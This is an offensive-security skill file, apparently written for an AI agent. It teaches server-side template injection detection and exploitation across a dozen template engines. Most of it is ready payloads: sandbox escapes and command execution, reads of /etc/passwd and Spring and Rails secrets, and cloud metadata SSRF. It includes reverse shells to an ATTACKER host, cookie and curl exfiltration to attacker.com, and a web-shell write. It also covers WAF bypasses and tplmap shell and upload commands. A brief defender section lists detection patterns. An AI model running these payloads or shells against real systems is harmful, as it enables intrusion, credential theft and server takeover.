---
name: offensive-ssti
description: "Server-Side Template Injection methodology covering detection through exploitation across all major template engines. Includes polyglot detection strings and engine fingerprinting decision trees, engine-specific exploitation for Jinja2 (MRO sandbox escape), Twig (_self.env gadgets), Freemarker (Execute class), Velocity (Runtime.exec), Pebble (java.lang.Runtime), Smarty (literal tag abuse), Mako (module.os), Handlebars (prototype pollution to RCE), ERB (system/exec), and Thymeleaf (SpEL expression injection). Covers blind SSTI via time-based delays, OOB DNS exfiltration, and error inference. Addresses filter bypass through encoding, string concatenation, attribute access alternatives, and WAF evasion. Maps exploitation in modern frameworks including Flask, Django, Spring Boot, Express, and Rails. Details chaining paths from SSTI to SSRF, file read, and full RCE, plus automated exploitation with tplmap and SSTImap."
---

# Server-Side Template Injection (SSTI)

Server-side template injection occurs when user input is concatenated into a template
string and processed by the template engine as code rather than data. The engine
evaluates the injected expression, giving you access to the server-side runtime. In
most engines this leads directly to remote code execution because template languages
expose access to the underlying language's object model. You find SSTI wherever
developers pass user input to functions like `render_template_string()`,
`Template.compile()`, or `new Template()` instead of passing it as a template variable.

## Quick Workflow

1. Identify all reflection points: URL parameters, POST bodies, headers, JSON values, path segments.
2. Inject polyglot detection strings and observe responses for evaluation, errors, or blank output.
3. Fingerprint the template engine using engine-specific syntax and error signatures.
4. Confirm server-side execution (not client-side rendering or XSS).
5. Select engine-specific payloads for information disclosure, file read, or RCE.
6. Bypass filters and WAF rules using encoding, concatenation, or alternative attribute access.
7. For blind contexts, use time-based, OOB DNS, or error-based inference techniques.
8. Chain SSTI to SSRF, file read, or full RCE depending on the engine and sandbox.

---

## Detection and Engine Fingerprinting

### Polyglot Detection Strings

Inject these strings into every reflection point. Each one triggers evaluation in
different engine families, so a single response that shows mathematical evaluation,
an error traceback, or blank output where the string should appear indicates SSTI.

```text
# Universal polyglots - inject these first
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}
#{7*7}
*{7*7}
@(7+7)

# Engine-narrowing probes
{{config}}                    # Jinja2/Flask - dumps app config
{{self}}                      # Jinja2 - returns TemplateReference
${T(java.lang.Math).PI}      # Thymeleaf/SpEL - returns 3.14159...
${class.getSimpleName()}      # Velocity - returns class name
{$smarty.version}             # Smarty - returns version string
{{_self.env}}                 # Twig - returns Environment object
<#assign x=1>${x}            # Freemarker - returns 1
${self.module.__name__}       # Mako - returns module name
```

### Engine Fingerprinting Decision Tree

Use a systematic approach to identify the engine. Start with `{{7*7}}` and branch
based on the response:

```text
Inject {{7*7}}
  |
  +-- Returns "49" --> Jinja2, Twig, Nunjucks, or Handlebars
  |     |
  |     +-- Inject {{7*'7'}}
  |           +-- Returns "7777777" --> Jinja2 or Nunjucks
  |           |     +-- Inject {{config}} --> returns config? --> Jinja2 (Flask)
  |           |     +-- Inject {{range(10)}} --> works? --> Nunjucks
  |           +-- Returns "49" --> Twig
  |           +-- Error --> Handlebars (limited expression support)
  |
  +-- No output or error --> Try ${7*7}
  |     +-- Returns "49" --> Freemarker, Velocity, Mako, or Thymeleaf
  |     |     +-- Inject ${class} --> returns object? --> Velocity
  |     |     +-- Inject ${T(java.lang.Math).PI} --> returns pi? --> Thymeleaf (SpEL)
  |     |     +-- Inject <#assign x=1>${x} --> returns 1? --> Freemarker
  |     |     +-- Error contains "mako" --> Mako
  |     +-- No output --> Try <%= 7*7 %>
  |           +-- Returns "49" --> ERB (Ruby) or EJS (Node)
  |           +-- Error with "erb" or "Erubi" --> ERB
  |           +-- Error with "ejs" --> EJS
  |
  +-- Reflected literally --> Try @(7+7)
        +-- Returns "14" --> Razor (.NET)
        +-- No evaluation --> Likely not vulnerable (or requires different syntax)
```

### Error-Based Identification

Deliberately trigger errors to extract engine and version information from stack traces:

```text
# Trigger division by zero or type errors
{{7/0}}              # Jinja2: ZeroDivisionError traceback
${7/0}               # Freemarker: ArithmeticException
<%= 7/0 %>           # ERB: ZeroDivisionError
{{foobar}}           # Twig: Variable "foobar" does not exist
${foobar}            # Velocity: prints literally (no error, useful signal)
{{__xxxxxxx__}}      # Jinja2: UndefinedError with engine name in traceback
```

### Blind SSTI Detection

When output is not reflected (email templates, PDF generation, background jobs), use
out-of-band and time-based techniques.

```text
# Time-based (Jinja2) - cause a measurable delay
{{range(99999999)|join}}

# Time-based (Freemarker) - Thread.sleep
${T(java.lang.Thread).sleep(5000)}

# OOB DNS exfiltration (Jinja2)
{{''.__class__.__mro__[1].__subclasses__()[XXX]('nslookup burpcollaborator.net',shell=True,stdout=-1).communicate()}}

# OOB HTTP (Twig with curl)
{{'/usr/bin/curl http://attacker.com/'|filter('system')}}

# Error inference - inject invalid syntax and check for behavioral differences
# If {{7*7}} and {{7*'INVALID are handled differently (error page vs. normal page),
# the engine is processing the input even without visible output
```

---

## Engine-Specific Exploitation

### Jinja2 (Python) - MRO Sandbox Escape

Jinja2's sandboxed mode restricts attribute access, but you bypass it by walking the
Method Resolution Order (MRO) to reach `object.__subclasses__()` and from there to
dangerous classes like `subprocess.Popen` or `os._wrap_close`.

```python
# Step 1: Reach the object base class via MRO
{{ ''.__class__.__mro__[1] }}
# Returns: <class 'object'>

# Step 2: List all subclasses
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Step 3: Find subprocess.Popen (index varies by Python version)
# Enumerate at runtime - never hardcode the index
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}
    {{ loop.index0 }}: {{ cls }}
  {% endif %}
{% endfor %}

# Step 4: RCE via subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0] }}

# Alternative: reach os module through __globals__
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Alternative: through cycler (works in strict sandboxes)
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Alternative: through config object (Flask)
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('id').read() }}

# File read without RCE
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

### Twig (PHP) - _self.env and Filter Abuse

Twig 1.x exposed `_self.env` which gave access to the Environment object and its
methods. Twig 2.x+ removed direct access, but filter-based exploitation remains
viable when unsafe extensions are loaded.

```php
# Twig 1.x - _self.env access (deprecated but still found in legacy apps)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Twig 2.x/3.x - filter-based execution (requires 'system' or similar in allowed filters)
{{'id'|filter('system')}}
{{'cat /etc/passwd'|filter('exec')}}

# Twig - information disclosure
{{app.request.server.all|join(',')}}
{{app.request.cookies.all|join(',')}}
{{'/'|file_excerpt(1,30)}}

# Twig - reading files via the source function (if available)
{{'/etc/passwd'|file_excerpt(1,100)}}

# Twig 3.x - map filter for RCE
{{'id'|filter('passthru')}}
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|map('passthru')}}

# Twig - using sort filter with a callback
{{['id',0]|sort('system')|join}}
```

### Freemarker (Java) - Execute Class

Freemarker provides the `freemarker.template.utility.Execute` class which directly
executes system commands when instantiated via the `?new()` built-in.

```java
// Direct RCE via Execute class
<#assign cmd = "freemarker.template.utility.Execute"?new()>
${cmd("id")}
${cmd("cat /etc/passwd")}

// Alternative one-liner
${"freemarker.template.utility.Execute"?new()("id")}

// ObjectConstructor for arbitrary class instantiation
<#assign classloader=object?new("java.lang.ProcessBuilder", ["id"])>
${classloader.start()}

// File read via TemplateModel
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

// Environment variable disclosure
${.data_model}
${.globals}
```

### Velocity (Java) - Runtime.exec

Velocity templates access Java objects directly. Use the `$class` variable or
reflection to reach `java.lang.Runtime`.

```java
// Classic RCE via Runtime.exec
#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
#set($process = $runtime.exec("id"))
#set($reader = $class.inspect("java.io.BufferedReader").type)
#set($isr = $class.inspect("java.io.InputStreamReader").type)
#set($input = $reader.getDeclaredConstructor($isr).newInstance($process.getInputStream()))
#foreach($i in [1..100])
  #set($line = $input.readLine())
  #if($line) $line #end
#end

// Shorter alternative
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$x.waitFor()
#set($s=$class.inspect("java.util.Scanner").type)
#set($sc=$s.getDeclaredConstructor($x.getInputStream().getClass()).newInstance($x.getInputStream()))
$sc.useDelimiter("\\A").next()
```

### Pebble (Java) - java.lang.Runtime

Pebble is a Java template engine inspired by Twig. It exposes Java objects through
template expressions.

```java
// RCE via beans and Runtime
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}

// Alternative via ProcessBuilder
{% set pb = (1).TYPE.forName('java.lang.ProcessBuilder') %}
{% set process = pb.getDeclaredConstructors()[0].newInstance([['id']]) %}
{{ process.start().inputStream.readAllBytes() }}
```

### Smarty (PHP) - literal Tag and Static Methods

Smarty allows PHP code execution through several vectors depending on version and
configuration.

```php
// Smarty 3.x - {php} tags (if enabled, disabled by default in 3.1+)
{php}echo shell_exec('id');{/php}

// Smarty - static method calls
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}

// Smarty - {literal} tag abuse for JavaScript injection leading to SSJI
{literal}<script>document.location='http://attacker.com/?c='+document.cookie</script>{/literal}

// Smarty - math function abuse
{math equation="(\"\\x73\\x79\\x73\\x74\\x65\\x6d\")(\"id\")"}

// Smarty - information disclosure
{$smarty.version}
{$smarty.template}
{$smarty.config}
```

### Mako (Python) - Module-Level Imports

Mako templates have direct access to Python's module system through the `self.module`
namespace, making RCE straightforward.

```python
# Direct os module access
${self.module.cache.util.os.popen('id').read()}

# Alternative via __import__
<% import os %>${os.popen('id').read()}

# Using the module namespace
${self.module.os.popen('id').read()}

# File read
<% f = open('/etc/passwd').read() %>${f}

# Reverse shell
<% import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]) %>
```

### ERB (Ruby) - system and exec

ERB (Embedded Ruby) templates execute Ruby code directly within `<%= %>` tags.

```ruby
# Command execution
<%= system("id") %>
<%= `id` %>
<%= exec("id") %>
<%= IO.popen("id").read() %>

# File read
<%= File.open('/etc/passwd').read() %>
<%= Dir.entries('/') %>

# Reverse shell
<%= require 'socket'; TCPSocket.open('ATTACKER',4444).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f) %>

# Environment variables
<%= ENV.to_a.map{|k,v| "#{k}=#{v}"}.join("\n") %>
```

### Thymeleaf (Java/Spring) - SpEL Expression Injection

Thymeleaf in Spring Boot applications evaluates Spring Expression Language (SpEL).
When user input reaches a Thymeleaf template path or expression, you get code execution
through SpEL.

```java
// SpEL RCE via T() operator (type reference)
${T(java.lang.Runtime).getRuntime().exec('id')}

// SpEL with output capture
${T(org.apache.commons.io.IOUtils).toString(
  T(java.lang.Runtime).getRuntime().exec('id').getInputStream()
)}

// URL-based injection in Spring Boot (path variable interpreted as template)
// GET /path;/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// Thymeleaf preprocessor expressions
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// File read via SpEL
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}

// Environment disclosure
${@environment.getProperty('spring.datasource.password')}
```

### Handlebars (Node.js) - Prototype Pollution to RCE

Handlebars is logic-less by design, but prototype pollution or unsafe helpers create
RCE paths.

```javascript
// Prototype pollution to RCE (requires a prototype pollution gadget)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

// Via unsafe custom helpers (if registered)
{{execute "id"}}

// Information disclosure
{{this}}
{{@root}}
```

---

## Filter Bypass and WAF Evasion

### Character Restriction Bypass (Jinja2)

When characters like `.`, `_`, `[`, or `'` are filtered, use alternative access methods.

```python
# Dot (.) blocked - use attr() filter or bracket notation
{{ request|attr('application') }}
{{ request['application'] }}

# Underscore (_) blocked - use hex encoding
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
# Or pass via request parameter: ?a=__class__
{{ ''|attr(request.args.a) }}

# Quotes blocked - use request parameters to inject strings
# URL: ?cmd=id&module=os
{{ self.__init__.__globals__.__builtins__.__import__(request.args.module).popen(request.args.cmd).read() }}

# Brackets blocked - use attr() chains
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

# Multiple restrictions - combine techniques
# Pass components via URL parameters and assemble at runtime
# URL: ?c=__class__&m=__mro__&s=__subclasses__
{{ ()|attr(request.args.c)|attr(request.args.m)|last|attr(request.args.s)() }}
```

### String Concatenation Evasion

```python
# Jinja2 - concatenate blocked keywords
{{ ''['__cla'+'ss__'] }}
{{ ''|attr('__cla'~'ss__') }}              # Tilde is Jinja2 concat operator
{{ ''|attr(['__cla','ss__']|join) }}

# Jinja2 - build strings from chr() via request
{% set chr = ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__.__builtins__.chr %}
{{ ''[chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)] }}

# Twig - concatenate
{{ ('sys'~'tem')('id') }}
```

### Encoding-Based Bypass

```python
# Hex encoding for attribute names (Jinja2)
{{ request['\x5f\x5fclass\x5f\x5f'] }}
{{ request|attr('\x5f\x5fclass\x5f\x5f') }}

# Unicode encoding
{{ request|attr('__class__') }}

# Octal encoding
{{ request|attr('\137\137class\137\137') }}

# Base64 in Mako
<% import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBwcmludChvcy5wb3BlbignaWQnKS5yZWFkKCkp')) %>

# URL encoding for WAF bypass (double-encode if WAF decodes once)
%7B%7B7*7%7D%7D
%257B%257B7*7%257D%257D   # double-encoded
```

### WAF-Specific Bypass Techniques

```text
# Technique: Break tokens across parameters
# Some WAFs scan individual parameters but not their combination
?a={{&b=7*7&c=}}

# Technique: Use HTTP parameter pollution
?name={{7*7}}&name=safe_value    # Some backends take the first, WAF checks the last

# Technique: Content-Type confusion
# Submit as application/json or multipart/form-data if the WAF only inspects
# application/x-www-form-urlencoded

# Technique: Case variation (engine-dependent)
# Some engines are case-insensitive for built-in names
{{Config}}    # May work if WAF blocks lowercase {{config}}

# Technique: Whitespace and comment injection
{{ 7 * 7 }}           # Extra spaces
{%- if 1 -%}49{%- endif -%}    # Jinja2 whitespace control
{{7 *- 7}}            # Unusual operator spacing
```

---

## Modern Framework Exploitation

### Flask / Jinja2 (Python)

```python
# Flask debug mode - check for Werkzeug debugger console
# GET /__debugger__?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=SECRET

# Flask config secrets
{{ config.SECRET_KEY }}
{{ config['SQLALCHEMY_DATABASE_URI'] }}

# Django templates (limited by design - no arbitrary code execution)
# But information disclosure is possible
{{ settings.SECRET_KEY }}     # If debug=True
{% debug %}                    # Dumps context variables
{{ request.META }}             # Server environment
```

### Spring Boot / Thymeleaf (Java)

```java
// Path-based SSTI in Spring Boot (CVE-2020-27386 pattern)
// Controller returns user input as view name
// GET /path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// SpEL injection via @Value or th:text
// If user input reaches a SpEL expression context:
${T(java.lang.Runtime).getRuntime().exec(
  new String[]{'bash','-c','curl http://attacker.com/$(whoami)'}
)}

// Accessing Spring beans
${@beanName.methodName()}
${@environment.getProperty('spring.datasource.url')}

// Bypassing SpEL restrictions
${T(Character).toString(105).concat(T(Character).toString(100))}   # builds "id"
```

### Express / EJS / Pug (Node.js)

```javascript
// EJS - when user input reaches template compilation
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// EJS - via constructor chain
<%= this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>

// Pug/Jade - code injection
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
p= x

// Nunjucks - reaching require through global
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### Rails / ERB (Ruby)

```ruby
# Standard ERB injection
<%= `id` %>
<%= system('id') %>

# Via Object#send for filter bypass
<%= ''.class.class.methods.grep(/new/).first %>
<%= Kernel.send(:system, 'id') %>

# Accessing Rails secrets
<%= Rails.application.credentials.secret_key_base %>
<%= Rails.application.secrets %>
```

---

## Chaining SSTI to Higher Impact

### SSTI to SSRF

Use template engine capabilities to make server-side HTTP requests, reaching internal
services and cloud metadata endpoints.

```python
# Jinja2 - SSRF via urllib (if available in subclasses)
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}

# Twig - SSRF via file_get_contents
{{ '/proc/net/tcp'|file_excerpt(1,100) }}

# Freemarker - SSRF via URL include
<#include "http://169.254.169.254/latest/meta-data/">

# Thymeleaf/SpEL - SSRF via URL class
${T(java.net.URI).create('http://169.254.169.254/latest/meta-data/').toURL().openStream()}
```

### SSTI to File Read

```python
# Jinja2 - read files via file subclass
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Freemarker - include directive
<#include "/etc/passwd">

# ERB - File.read
<%= File.read('/etc/passwd') %>

# Mako - direct open
<% print(open('/etc/passwd').read()) %>
```

### SSTI to Full RCE

Once you have code execution through any engine, escalate to a proper reverse shell
for interactive access.

```bash
# Generate a reverse shell payload and deliver via SSTI
# Jinja2 reverse shell:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read() }}

# For Java engines (Freemarker, Velocity, Pebble, Thymeleaf):
${"freemarker.template.utility.Execute"?new()("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
```

---

## Automated Exploitation with tplmap

tplmap automates SSTI detection and exploitation across multiple engines. Use it for
initial discovery, then switch to manual payloads for complex scenarios.

```bash
# Basic scan
python tplmap.py -u 'http://target.com/page?name=test'

# Scan with POST data
python tplmap.py -u 'http://target.com/page' -d 'name=test'

# Scan specific parameter in URL
python tplmap.py -u 'http://target.com/page?name=test*'  # asterisk marks injection point

# Force a specific engine
python tplmap.py -u 'http://target.com/page?name=test' -e jinja2

# Execute OS commands
python tplmap.py -u 'http://target.com/page?name=test' --os-cmd 'id'

# Spawn an interactive shell
python tplmap.py -u 'http://target.com/page?name=test' --os-shell

# File read / write
python tplmap.py -u 'http://target.com/page?name=test' --download /etc/passwd ./passwd
python tplmap.py -u 'http://target.com/page?name=test' --upload ./shell.php /var/www/html/shell.php

# SSTImap (maintained fork with additional engines)
python3 sstimap.py -u 'http://target.com/page?name=test' -s    # scan mode
python3 sstimap.py -u 'http://target.com/page?name=test' -S    # interactive shell

# TInjA (template injection analyzer)
tinja url -u 'http://target.com/page?name=test'
tinja url -u 'http://target.com/page?name=test' -e jinja2 --cmd 'id'
```

---

## Detection / Defender View

Defenders can detect and prevent SSTI at multiple layers.

**Code-level prevention:**
- Never concatenate user input into template strings. Always pass data as template variables.
- Block dangerous APIs at the linter level: `render_template_string`, `Template()` with user input, `compile` with user input.
- Use semgrep or CodeQL SSTI rule packs in CI pipelines to catch unsafe patterns before deployment.

**Runtime detection signals:**
- Template error messages in HTTP responses (stack traces mentioning Jinja2, Twig, Freemarker).
- Requests containing template metacharacters: `{{`, `${`, `<%`, `{%`, `#{`, `*{`.
- Requests with MRO traversal patterns: `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__builtins__`.
- Requests with Java reflection patterns: `getRuntime`, `exec(`, `ProcessBuilder`, `forName`.
- DNS queries to unexpected external domains from application servers (OOB exfiltration).
- Unusual process spawning from web server processes (shell, python, curl).

**WAF rules:**
- Block or alert on `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__import__` in request parameters.
- Block `T(java.lang.Runtime)`, `getRuntime()`, `ProcessBuilder` in request parameters.
- Block `{%`, `{{`, `${`, `<%=` in contexts where template syntax is not expected.
- Beware of bypass via encoding; decode before inspection.

**Sandboxing:**
- Enable template engine sandboxing where available (Jinja2 SandboxedEnvironment, Freemarker template security manager).
- Run application processes with minimal OS privileges and seccomp/AppArmor profiles.
- Use `html/template` over `text/template` in Go applications.
- Disable `{php}` tags in Smarty; disable debug compilation in EJS; restrict SpEL in Thymeleaf.

---

## Engagement Cheatsheet

```text
ENGINE          DETECT                    INFO DISCLOSURE           RCE PAYLOAD
------------------------------------------------------------------------------------------
Jinja2          {{7*'7'}}=7777777         {{config}}                {{self.__init__.__globals__.__builtins__
                                                                      .__import__('os').popen('CMD').read()}}

Twig 1.x        {{7*7}}=49               {{_self.env}}             {{_self.env.registerUndefinedFilterCallback
                                                                      ("exec")}}{{_self.env.getFilter("CMD")}}

Twig 3.x        {{7*7}}=49               {{app.request.server}}    {{['CMD']|map('system')}}

Freemarker      ${7*7}=49                ${.data_model}            ${"freemarker.template.utility.Execute"
                                                                      ?new()("CMD")}

Velocity        $class.type              #set($x=$class.inspect    #set($rt=$class.inspect("java.lang
                                           ("java.lang.System"))      .Runtime").type.getRuntime().exec("CMD"))

Pebble          {{7*7}}=49               {{beans}}                 See beans/Runtime chain above

Smarty          {$smarty.version}         {$smarty.template}        {system('CMD')} or math equation abuse

Mako            ${7*7}=49                ${self.module.__name__}   ${self.module.cache.util.os
                                                                      .popen('CMD').read()}

ERB             <%=7*7%>=49              <%=ENV%>                  <%=system('CMD')%>

Thymeleaf       ${T(Math).PI}=3.14...    ${@environment}           ${T(java.lang.Runtime).getRuntime()
                                                                      .exec('CMD')}

Handlebars      {{this}}=object dump     {{@root}}                 Requires proto pollution or unsafe helpers

EJS             <%=7*7%>=49              <%=process.env%>          <%=global.process.mainModule.require(
                                                                      'child_process').execSync('CMD')%>

Nunjucks        {{7*7}}=49               {{range.constructor}}     {{range.constructor("return global.process
                                                                      .mainModule.require('child_process')
                                                                      .execSync('CMD')")()}}
```

```text
BYPASS QUICK REFERENCE
  Dot blocked:        |attr('name') or ['name']
  Underscore blocked: \x5f (hex) or request.args
  Quotes blocked:     request.args.param or chr() construction
  Brackets blocked:   |attr() chains with |attr('__getitem__')
  Keywords blocked:   string concatenation ('o'+'s') or ~ operator
  WAF blocking {{:    double-encode %257B%257B or HPP
  Blind context:      time delay, OOB DNS, error-based inference
```

---

## Key References

- PortSwigger SSTI Research: https://portswigger.net/research/server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- tplmap: https://github.com/epinna/tplmap
- SSTImap: https://github.com/vladko312/SSTImap
- TInjA: https://github.com/Hackmanit/TInjA
- Jinja2 Documentation (sandbox): https://jinja.palletsprojects.com/en/3.1.x/sandbox/
- Spring SpEL Documentation: https://docs.spring.io/spring-framework/reference/core/expressions.html
- Freemarker Security: https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security
